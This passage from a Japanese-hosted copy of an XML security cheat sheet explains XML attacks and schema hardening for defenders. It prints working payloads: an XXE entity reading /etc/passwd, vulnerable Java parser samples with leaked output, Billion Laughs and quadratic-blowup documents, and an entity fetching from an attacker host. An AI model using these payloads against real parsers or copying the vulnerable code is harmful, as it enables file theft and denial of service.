---
title: XML Security Cheat Sheet
hide_title: true
---

<div className="docHero" data-category="encoding-and-sanitization">
  <h1>XML セキュリティチートシート</h1>
  <div className="docMeta">
    <span className="docPill">最終更新: 2026-05-20</span>
    <span className="docPill">読了時間: 約 15 分</span>
    <span className="docPill">カテゴリ: 入力検証とサニタイズ</span>
  </div>
</div>

<p className="docLead">XML セキュリティチートシートを、原文・翻訳・対比表示で確認できます。ASVS Index 対応の文脈で、公式原文と日本語訳を確認しやすく整理しています。</p>

<div className="tabbedContent">
  <input className="tabInput" type="radio" name="xml-security-view" id="xml-security-original" />
  <input className="tabInput" type="radio" name="xml-security-view" id="xml-security-translation" defaultChecked />
  <input className="tabInput" type="radio" name="xml-security-view" id="xml-security-bilingual" />

  <div className="contentTabs">
    <label htmlFor="xml-security-original" title="OWASP 原文">原文</label>
    <label htmlFor="xml-security-translation" title="日本語訳">翻訳</label>
    <label htmlFor="xml-security-bilingual" title="原文と翻訳を並べて確認">対比表示</label>
  </div>

<section id="xml-security-original-panel" className="tabPanel originalPanel contentPanel">

## Introduction

While the specifications for XML and XML schemas provide you with the tools needed to protect XML applications, they also include multiple security flaws. They can be exploited to perform multiple types of attacks, including file retrieval, server side request forgery, port scanning, and brute forcing. This cheat sheet will make you aware of how attackers can exploit the different possibilities in XML used in libraries and software using two possible attack surfaces:

- **Malformed XML Documents**: Exploiting vulnerabilities that occur when applications encounter XML documents that are not well-formed.
- **Invalid XML Documents**: Exploiting vulnerabilities that occur when documents that do not have the expected structure.

## Dealing with malformed XML documents

### Definition of a malformed XML document

 If an XML document does not follow the W3C XML specification's definition of a well-formed document, it is considered "malformed." **If an XML document is malformed, the XML parser will detect a fatal error, it should stop execution, the document should not undergo any additional processing, and the application should display an error message.** A malformed document can include one or more of the following problems: a missing ending tag, the order of elements into a nonsensical structure, introducing forbidden characters, and so on.

### Handling malformed XML documents

**To deal with malformed documents, developers should use an XML processor that follows W3C specifications and does not take significant additional time to process malformed documents.** In addition, they should only use well-formed documents, validate the contents of each element, and process only valid values within predefined boundaries.

#### Malformed XML documents require extra time

**A malformed document may affect the consumption of Central Processing Unit (CPU) resources.** In certain scenarios, the amount of time required to process malformed documents may be greater than that required for well-formed documents. When this happens, an attacker may exploit an asymmetric resource consumption attack to take advantage of the greater processing time to cause a Denial of Service (DoS).

**To analyze the likelihood of this attack, analyze the time taken by a regular XML document vs the time taken by a malformed version of that same document.** Then, consider how an attacker could use this vulnerability in conjunction with an XML flood attack using multiple documents to amplify the effect.

### Applications Processing Malformed Data

**Certain XML parsers have the ability to recover malformed documents.** They can be instructed to try their best to return a valid tree with all the content that they can manage to parse, regardless of the document's noncompliance with the specifications. **Since there are no predefined rules for the recovery process, the approach and results from these parsers may not always be the same. Using malformed documents might lead to unexpected issues related to data integrity.**

The following two scenarios illustrate attack vectors a parser will analyze in recovery mode:

#### Malformed Document to Malformed Document

According to the XML specification, the string `--` (double-hyphen) must not occur within comments. Using the recovery mode of lxml and PHP, the following document will remain the same after being recovered:

```xml
<element>
 <!-- one
  <!-- another comment
 comment -->
</element>
```

#### Well-Formed Document to Well-Formed Document Normalized

Certain parsers may consider normalizing the contents of your `CDATA` sections. This means that they will update the special characters contained in the `CDATA` section to contain the safe versions of these characters even though is not required:

```xml
<element>
 <![CDATA[<script>a=1;</script>]]>
</element>
```

Normalization of a `CDATA` section is not a common rule among parsers. Libxml could transform this document to its canonical version, but although well formed, its contents may be considered malformed depending on the situation:

```xml
<element>
 &lt;script&gt;a=1;&lt;/script&gt;
</element>
```

### Handling coercive parsing

**One popular coercive attack in XML involves parsing deeply nested XML documents without their corresponding ending tags. The idea is to make the victim use up -and eventually deplete- the machine's resources and cause a denial of service on the target.** Reports of a DoS attack in Firefox 3.67 included the use of 30,000 open XML elements without their corresponding ending tags. Removing the closing tags simplified the attack since it requires only half of the size of a well-formed document to accomplish the same results. The number of tags being processed eventually caused a stack overflow. A simplified version of such a document would look like this:

```xml
<A1>
 <A2>
  <A3>
   ...
    <A30000>
```

## Violation of XML Specification Rules

Unexpected consequences may result from manipulating documents using parsers that do not follow W3C specifications. **It may be possible to achieve crashes and/or code execution when the software does not properly verify how to handle incorrect XML structures. Feeding the software with fuzzed XML documents may expose this behavior.**

## Dealing with invalid XML documents

**Attackers may introduce unexpected values in documents to take advantage of an application that does not verify whether the document contains a valid set of values.** Schemas specify restrictions that help identify whether documents are valid, and a valid document is well formed and complies with the restrictions of a schema. More than one schema can be used to validate a document, and these restrictions may appear in multiple files, either using a single schema language or relying on the strengths of the different schema languages.

The recommendation to avoid these vulnerabilities is that each XML document must have a precisely defined XML Schema (not [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)) with every piece of information properly restricted to avoid problems of improper data validation. Use a local copy or a known good repository instead of the schema reference supplied in the XML document. Also, perform an integrity check of the XML schema file being referenced, bearing in mind the possibility that the repository could be compromised. In cases where the XML documents are using remote schemas, configure servers to use only secure, encrypted communications to prevent attackers from eavesdropping on network traffic.

### Document without Schema

Consider a bookseller that uses a web service through a web interface to make transactions. The XML document for transactions is composed of two elements: an `id` value related to an item and a certain `price`. The user may only introduce a certain `id` value using the web interface:

```xml
<buy>
 <id>123</id>
 <price>10</price>
</buy>
```

**If there is no control on the document's structure, the application could also process different well-formed messages with unintended consequences. The previous document could have contained additional tags to affect the behavior of the underlying application processing its contents**:

```xml
<buy>
 <id>123</id><price>0</price><id></id>
 <price>10</price>
</buy>
```

Notice again how the value 123 is supplied as an `id`, but now the document includes additional opening and closing tags. The attacker closed the `id` element and sets a bogus `price` element to the value 0. The final step to keep the structure well-formed is to add one empty `id` element. After this, the application adds the closing tag for `id` and set the `price` to 10. If the application processes only the first values provided for the ID and the value without performing any type of control on the structure, it could benefit the attacker by providing the ability to buy a book without actually paying for it.

### Unrestrictive Schema

**Certain schemas do not offer enough restrictions for the type of data that each element can receive.** This is what normally happens when using [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp); it has a very limited set of possibilities compared to the type of restrictions that can be applied in XML documents. This could expose the application to undesired values within elements or attributes that would be easy to constrain when using other schema languages. In the following example, a person's `age` is validated against an inline [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schema:

```xml
<!DOCTYPE person [
 <!ELEMENT person (name, age)>
 <!ELEMENT name (#PCDATA)>
 <!ELEMENT age (#PCDATA)>
]>
<person>
 <name>John Doe</name>
 <age>11111..(1.000.000digits)..11111</age>
</person>
```

The previous document contains an inline [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) with a root element named `person`. This element contains two elements in a specific order: `name` and then `age`. The element `name` is then defined to contain `PCDATA` as well as the element `age`.

After this definition begins the well-formed and valid XML document. The element name contains an irrelevant value but the `age` element contains one million digits. Since there are no restrictions on the maximum size for the `age` element, this one-million-digit string could be sent to the server for this element.

Typically this type of element should be restricted to contain no more than a certain amount of characters and constrained to a certain set of characters (for example, digits from 0 to 9, the + sign and the - sign). If not properly restricted, applications may handle potentially invalid values contained in documents.

Since it is not possible to indicate specific restrictions (a maximum length for the element `name` or a valid range for the element `age`), this type of schema increases the risk of affecting the integrity and availability of resources.

### Improper Data Validation

**When schemas are insecurely defined and do not provide strict rules, they may expose the application to diverse situations. The result of this could be the disclosure of internal errors or documents that hit the application's functionality with unexpected values.**

#### String Data Types

Provided you need to use a hexadecimal value, there is no point in defining this value as a string that will later be restricted to the specific 16 hexadecimal characters. To exemplify this scenario, when using XML encryption some values must be encoded using base64 . This is the schema definition of how these values should look:

```xml
<element name="CipherData" type="xenc:CipherDataType"/>
 <complexType name="CipherDataType">
  <choice>
   <element name="CipherValue" type="base64Binary"/>
   <element ref="xenc:CipherReference"/>
  </choice>
 </complexType>
```

The previous schema defines the element `CipherValue` as a base64 data type. As an example, the IBM WebSphere DataPower SOA Appliance allowed any type of characters within this element after a valid base64 value, and will consider it valid.

The first portion of this data is properly checked as a base64 value, but the remaining characters could be anything else (including other sub-elements of the `CipherData` element). Restrictions are partially set for the element, which means that the information is probably tested using an application instead of the proposed sample schema.

#### Numeric Data Types

**Defining the correct data type for numbers can be more complex since there are more options than there are for strings.**

##### Negative and Positive Restrictions

XML Schema numeric data types can include different ranges of numbers. They can include:

- **negativeInteger**: Only negative numbers
- **nonNegativeInteger**: Positive numbers and the zero value
- **positiveInteger**: Only positive numbers
- **nonPositiveInteger**: Negative numbers and the zero value

The following sample document defines an `id` for a product, a `price`, and a `quantity` value that is under the control of an attacker:

```xml
<buy>
 <id>1</id>
 <price>10</price>
 <quantity>1</quantity>
</buy>
```

**To avoid repeating old errors, an XML schema may be defined to prevent processing the incorrect structure in cases where an attacker wants to introduce additional elements:**

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:integer"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>
```

Limiting that `quantity` to an integer data type will avoid any unexpected characters. Once the application receives the previous message, it may calculate the final price by doing `price*quantity`. **However, since this data type may allow negative values, it might allow a negative result on the user's account if an attacker provides a negative number. What you probably want to see in here to avoid that logical vulnerability is positiveInteger instead of integer.**

##### Divide by Zero

**Whenever using user controlled values as denominators in a division, developers should avoid allowing the number zero. In cases where the value zero is used for division in XSLT, the error `FOAR0001` will occur. Other applications may throw other exceptions and the program may crash.** There are specific data types for XML schemas that specifically avoid using the zero value. For example, in cases where negative values and zero are not considered valid, the schema could specify the data type `positiveInteger` for the element.

```xml
<xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:positiveInteger"/>
 </xs:simpleType>
</xs:element>
```

The element `denominator` is now restricted to positive integers. This means that only values greater than zero will be considered valid. If you see any other type of restriction being used, you may trigger an error if the denominator is zero.

##### Special Values: Infinity and Not a Number (NaN)

The data types `float` and `double` contain real numbers and some special values: `-Infinity` or `-INF`, `NaN`, and `+Infinity` or `INF`. These possibilities may be useful to express certain values, but they are sometimes misused. The problem is that they are commonly used to express only real numbers such as prices. This is a common error seen in other programming languages, not solely restricted to these technologies.

Not considering the whole spectrum of possible values for a data type could make underlying applications fail. **If the special values `Infinity` and `NaN` are not required and only real numbers are expected, the data type `decimal` is recommended:**

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="buy">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="id" type="xs:integer"/>
    <xs:element name="price" type="xs:decimal"/>
    <xs:element name="quantity" type="xs:positiveInteger"/>
   </xs:sequence>
  </xs:complexType>
 </xs:element>
</xs:schema>
```

**The price value will not trigger any errors when set at Infinity or NaN, because these values will not be valid. An attacker can exploit this issue if those values are allowed.**

#### General Data Restrictions

After selecting the appropriate data type, developers may apply additional restrictions. Sometimes only a certain subset of values within a data type will be considered valid:

##### Prefixed Values

**Certain types of values should only be restricted to specific sets: traffic lights will have only three types of colors, only 12 months are available, and so on. It is possible that the schema has these restrictions in place for each element or attribute. This is the most perfect allow-list scenario for an application: only specific values will be accepted. Such a constraint is called `enumeration` in an XML schema.** The following example restricts the contents of the element month to 12 possible values:

```xml
<xs:element name="month">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:enumeration value="January"/>
   <xs:enumeration value="February"/>
   <xs:enumeration value="March"/>
   <xs:enumeration value="April"/>
   <xs:enumeration value="May"/>
   <xs:enumeration value="June"/>
   <xs:enumeration value="July"/>
   <xs:enumeration value="August"/>
   <xs:enumeration value="September"/>
   <xs:enumeration value="October"/>
   <xs:enumeration value="November"/>
   <xs:enumeration value="December"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

By limiting the month element's value to any of the previous values, the application will not be manipulating random strings.

##### Ranges

Software applications, databases, and programming languages normally store information within specific ranges. **Whenever using an element or an attribute in locations where certain specific sizes matter (to avoid overflows or underflows), it would be logical to check whether the data length is considered valid.** The following schema could constrain a name using a minimum and a maximum length to avoid unusual scenarios:

```xml
<xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:minLength value="3"/>
   <xs:maxLength value="256"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

In cases where the possible values are restricted to a certain specific length (let's say 8), this value can be specified as follows to be valid:

```xml
<xs:element name="name">
 <xs:simpleType>
  <xs:restriction base="xs:string">
   <xs:length value="8"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

##### Patterns

Certain elements or attributes may follow a specific syntax. You can add `pattern` restrictions when using XML schemas. **When you want to ensure that the data complies with a specific pattern, you can create a specific definition for it. Social security numbers (SSN) may serve as a good example; they must use a specific set of characters, a specific length, and a specific `pattern`:**

```xml
<xs:element name="SSN">
 <xs:simpleType>
  <xs:restriction base="xs:token">
   <xs:pattern value="[0-9]{3}-[0-9]{2}-[0-9]{4}"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

Only numbers between `000-00-0000` and `999-99-9999` will be allowed as values for a SSN.

##### Assertions

**Assertion components constrain the existence and values of related elements and attributes on XML schemas. An element or attribute will be considered valid with regard to an assertion only if the test evaluates to true without raising any error. The variable `$value` can be used to reference the contents of the value being analyzed.**

The *Divide by Zero* section above referenced the potential consequences of using data types containing the zero value for denominators, proposing a data type containing only positive values. An opposite example would consider valid the entire range of numbers except zero. To avoid disclosing potential errors, values could be checked using an `assertion` disallowing the number zero:

```xml
<xs:element name="denominator">
 <xs:simpleType>
  <xs:restriction base="xs:integer">
   <xs:assertion test="$value != 0"/>
  </xs:restriction>
 </xs:simpleType>
</xs:element>
```

The assertion guarantees that the `denominator` will not contain the value zero as a valid number and also allows negative numbers to be a valid denominator.

##### Occurrences

**The consequences of not defining a maximum number of occurrences could be worse than coping with the consequences of what may happen when receiving extreme numbers of items to be processed.** Two attributes specify minimum and maximum limits: `minOccurs` and `maxOccurs`.

 The default value for both the `minOccurs` and the `maxOccurs` attributes is `1`, but certain elements may require other values. For instance, if a value is optional, it could contain a `minOccurs` of 0, and if there is no limit on the maximum amount, it could contain a `maxOccurs` of `unbounded`, as in the following example:

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
 <xs:element name="operation">
  <xs:complexType>
   <xs:sequence>
    <xs:element name="buy" maxOccurs="unbounded">
     <xs:complexType>
      <xs:all>
       <xs:element name="id" type="xs:integer"/>
       <xs:element name="price" type="xs:decimal"/>
       <xs:element name="quantity" type="xs:integer"/>
      </xs:all>
     </xs:complexType>
    </xs:element>
  </xs:complexType>
 </xs:element>
</xs:schema>
```

The previous schema includes a root element named `operation`, which can contain an unlimited (`unbounded`) amount of buy elements. This is a common finding, since developers do not normally want to restrict maximum numbers of occurrences. **Applications using limitless occurrences should test what happens when they receive an extremely large amount of elements to be processed. Since computational resources are limited, the consequences should be analyzed and eventually a maximum number ought to be used instead of an `unbounded` value.**

### Jumbo Payloads

**Sending an XML document of 1GB requires only a second of server processing and might not be worth consideration as an attack. Instead, an attacker would look for a way to minimize the CPU and traffic used to generate this type of attack, compared to the overall amount of server CPU or traffic used to handle the requests.**

#### Traditional Jumbo Payloads

**There are two primary methods to make a document larger than normal:**

**- Depth attack: using a huge number of elements, element names, and/or element values.**

**- Width attack: using a huge number of attributes, attribute names, and/or attribute values.**

In most cases, the overall result will be a huge document. This is a short example of what this looks like:

```xml
<SOAPENV:ENVELOPE XMLNS:SOAPENV="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/"
                  XMLNS:EXT="HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL">
 <SOAPENV:HEADER LARGENAME1="LARGEVALUE"
                 LARGENAME2="LARGEVALUE2"
                 LARGENAME3="LARGEVALUE3" …>
 ...
```

#### "Small" Jumbo Payloads

**The following example is a very small document, but the results of processing this could be similar to those of processing traditional jumbo payloads.** The purpose of such a small payload is that it allows an attacker to send many documents fast enough to make the application consume most or all of the available resources:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
 <!ENTITY file SYSTEM "http://attacker/huge.xml" >
]>
<root>&file;</root>
```

### Schema Poisoning

**When an attacker is capable of introducing modifications to a schema, there could be multiple high-risk consequences. In particular, the effect of these consequences will be more dangerous if the schemas are using [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) (e.g., file retrieval, denial of service).** An attacker could exploit this type of vulnerability in numerous scenarios, always depending on the location of the schema.

#### Local Schema Poisoning

**Local schema poisoning happens when schemas are available in the same host, whether or not the schemas are embedded in the same XML document.**

##### Embedded Schema

**The most trivial type of schema poisoning takes place when the schema is defined within the same XML document.** Consider the following, unknowingly vulnerable example provided by the W3C :

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
 <!ELEMENT note (to,from,heading,body)>
 <!ELEMENT to (#PCDATA)>
 <!ELEMENT from (#PCDATA)>
 <!ELEMENT heading (#PCDATA)>
 <!ELEMENT body (#PCDATA)>
]>
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

All restrictions on the note element could be removed or altered, allowing the sending of any type of data to the server. Furthermore, if the server is processing external entities, the attacker could use the schema, for example, to read remote files from the server. **This type of schema only serves as a suggestion for sending a document, but it must contain a way to check the embedded schema integrity to be used safely. Attacks through embedded schemas are commonly used to exploit external entity expansions. Embedded XML schemas can also assist in port scans of internal hosts or brute force attacks.**

##### Incorrect Permissions

**You can often circumvent the risk of using remotely tampered versions by processing a local schema.**

```xml
<!DOCTYPE note SYSTEM "note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

**However, if the local schema does not contain the correct permissions, an internal attacker could alter the original restrictions.** The following line exemplifies a schema using permissions that allow any user to make modifications:

```text
-rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
```

The permissions set on `name.dtd` allow any user on the system to make modifications. This vulnerability is clearly not related to the structure of an XML or a schema, but since these documents are commonly stored in the filesystem, it is worth mentioning that an attacker could exploit this type of problem.

#### Remote Schema Poisoning

**Schemas defined by external organizations are normally referenced remotely. If capable of diverting or accessing the network's traffic, an attacker could cause a victim to fetch a distinct type of content rather than the one originally intended.**

##### Man-in-the-Middle (MitM) Attack

When documents reference remote schemas using the unencrypted Hypertext Transfer Protocol (HTTP), the communication is performed in plain text and an attacker could easily tamper with traffic. **When XML documents reference remote schemas using an HTTP connection, the connection could be sniffed and modified before reaching the end user:**

```xml
<!DOCTYPE note SYSTEM "http://example.com/note.dtd">
<note>
 <to>Tove</to>
 <from>Jani</from>
 <heading>Reminder</heading>
 <body>Don't forget me this weekend</body>
</note>
```

The remote file `note.dtd` could be susceptible to tampering when transmitted using the unencrypted HTTP protocol. One tool available to facilitate this type of attack is mitmproxy .

##### DNS-Cache Poisoning

Remote schema poisoning may also be possible even when using encrypted protocols like Hypertext Transfer Protocol Secure (HTTPS). **When software performs reverse Domain Name System (DNS) resolution on an IP address to obtain the hostname, it may not properly ensure that the IP address is truly associated with the hostname.** In this case, the software enables an attacker to redirect content to their own Internet Protocol (IP) addresses.

The previous example referenced the host `example.com` using an unencrypted protocol.

When switching to HTTPS, the location of the remote schema will look like `https://example/note.dtd`. In a normal scenario, the IP of `example.com` resolves to `1.1.1.1`:

```bash
$ host example.com
example.com has address 1.1.1.1
```

If an attacker compromises the DNS being used, the previous hostname could now point to a new, different IP controlled by the attacker `2.2.2.2`:

```bash
$ host example.com
example.com has address 2.2.2.2
```

When accessing the remote file, the victim may be actually retrieving the contents of a location controlled by an attacker.

##### Evil Employee Attack

When third parties host and define schemas, the contents are not under the control of the schemas' users. **Any modifications introduced by a malicious employee-or an external attacker in control of these files-could impact all users processing the schemas. Subsequently, attackers could affect the confidentiality, integrity, or availability of other services (especially if the schema in use is [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)).**

### XML Entity Expansion

**If the parser uses a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp), an attacker might inject data that may adversely affect the XML parser during document processing. These adverse effects could include the parser crashing or accessing local files.

#### Sample Vulnerable Java Implementations

**Using the [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) capabilities of referencing local or remote files it is possible to affect file confidentiality.** In addition, it is also possible to affect the availability of the resources if no proper restrictions have been set for the entities expansion. Consider the following example code of an XXE.

**Sample XML**:

```xml
<!DOCTYPE contacts SYSTEM "contacts.dtd">
<contacts>
 <contact>
  <firstname>John</firstname>
  <lastname>&xxe;</lastname>
 </contact>
</contacts>
```

**Sample DTD**:

```xml
<!ELEMENT contacts (contact*)>
<!ELEMENT contact (firstname,lastname)>
<!ELEMENT firstname (#PCDATA)>
<!ELEMENT lastname ANY>
<!ENTITY xxe SYSTEM "/etc/passwd">
```

##### XXE using DOM

```java
import java.io.IOException;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.xml.sax.InputSource;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

public class parseDocument {
 public static void main(String[] args) {
  try {
   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
   DocumentBuilder builder = factory.newDocumentBuilder();
   Document doc = builder.parse(new InputSource("contacts.xml"));
   NodeList nodeList = doc.getElementsByTagName("contact");
   for (int s = 0; s < nodeList.getLength(); s++) {
     Node firstNode = nodeList.item(s);
     if (firstNode.getNodeType() == Node.ELEMENT_NODE) {
       Element firstElement = (Element) firstNode;
       NodeList firstNameElementList = firstElement.getElementsByTagName("firstname");
       Element firstNameElement = (Element) firstNameElementList.item(0);
       NodeList firstName = firstNameElement.getChildNodes();
       System.out.println("First Name: "  + ((Node) firstName.item(0)).getNodeValue());
       NodeList lastNameElementList = firstElement.getElementsByTagName("lastname");
       Element lastNameElement = (Element) lastNameElementList.item(0);
       NodeList lastName = lastNameElement.getChildNodes();
       System.out.println("Last Name: " + ((Node) lastName.item(0)).getNodeValue());
     }
    }
  } catch (Exception e) {
    e.printStackTrace();
  }
 }
}
```

The previous code produces the following output:

```bash
$ javac parseDocument.java ; java parseDocument
First Name: John
Last Name: ### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

##### XXE using DOM4J

```java
import org.dom4j.Document;
import org.dom4j.DocumentException;
import org.dom4j.io.SAXReader;
import org.dom4j.io.OutputFormat;
import org.dom4j.io.XMLWriter;

public class test1 {
 public static void main(String[] args) {
  Document document = null;
  try {
   SAXReader reader = new SAXReader();
   document = reader.read("contacts.xml");
  } catch (Exception e) {
   e.printStackTrace();
  }
  OutputFormat format = OutputFormat.createPrettyPrint();
  try {
   XMLWriter writer = new XMLWriter( System.out, format );
   writer.write( document );
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}
```

The previous code produces the following output:

```bash
$ java test1
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE contacts SYSTEM "contacts.dtd">

<contacts>
 <contact>
  <firstname>John</firstname>
  <lastname>### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

##### XXE using SAX

```java
import java.io.IOException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

public class parseDocument extends DefaultHandler {
 public static void main(String[] args) {
  new parseDocument();
 }
 public parseDocument() {
  try {
   SAXParserFactory factory = SAXParserFactory.newInstance();
   SAXParser parser = factory.newSAXParser();
   parser.parse("contacts.xml", this);
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
 @Override
 public void characters(char[] ac, int i, int j) throws SAXException {
  String tmpValue = new String(ac, i, j);
  System.out.println(tmpValue);
 }
}
```

The previous code produces the following output:

```bash
$ java parseDocument
John
#### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

##### XXE using StAX

```java
import javax.xml.parsers.SAXParserFactory;
import javax.xml.stream.XMLStreamReader;
import javax.xml.stream.XMLInputFactory;
import java.io.File;
import java.io.FileReader;
import java.io.FileInputStream;

public class parseDocument {
 public static void main(String[] args) {
  try {
   XMLInputFactory xmlif = XMLInputFactory.newInstance();
   FileReader fr = new FileReader("contacts.xml");
   File file = new File("contacts.xml");
   XMLStreamReader xmlfer = xmlif.createXMLStreamReader("contacts.xml",
                                            new FileInputStream(file));
   int eventType = xmlfer.getEventType();
   while (xmlfer.hasNext()) {
    eventType = xmlfer.next();
    if(xmlfer.hasText()){
     System.out.print(xmlfer.getText());
    }
   }
   fr.close();
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}

```

The previous code produces the following output:

```bash
$ java parseDocument
<!DOCTYPE contacts SYSTEM "contacts.dtd">John### User Database
...
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
```

#### Quadratic Blowup

**Instead of defining multiple small, deeply nested entities, the attacker in this scenario defines one very large entity and refers to it as many times as possible, resulting in a quadratic expansion (*O(n^2)*).**

The result of the following attack will be 100,000 x 100,000 characters in memory.

```xml
<!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY A "AAAAA...(a 100.000 A's)...AAAAA">
]>
<root>&A;&A;&A;&A;...(a 100.000 &A;'s)...&A;&A;&A;&A;&A;</root>
```

#### Billion Laughs

**When an XML parser tries to resolve the external entities included within the following code, it will cause the application to start consuming all of the available memory until the process crashes.** This is an example XML document with an embedded [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schema including the attack:

```xml
<!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<root>&LOL9;</root>
```

The entity `LOL9` will be resolved as the 10 entities defined in `LOL8`; then each of these entities will be resolved in `LOL7` and so on. Finally, the CPU and/or memory will be affected by parsing the `3 x 10^9` (3,000,000,000) entities defined in this schema, which could make the parser crash.

**The Simple Object Access Protocol ([SOAP](https://en.wikipedia.org/wiki/SOAP)) specification forbids [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)s completely. This means that a SOAP processor can reject any SOAP message that contains a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). Despite this specification, certain SOAP implementations did parse [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schemas within SOAP messages.**

The following example illustrates a case where the parser is not following the specification, enabling a reference to a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) in a SOAP message:

```xml
<?XML VERSION="1.0" ENCODING="UTF-8"?>
<!DOCTYPE SOAP-ENV:ENVELOPE [
 <!ELEMENT SOAP-ENV:ENVELOPE ANY>
 <!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<SOAP:ENVELOPE ENTITYREFERENCE="&LOL9;"
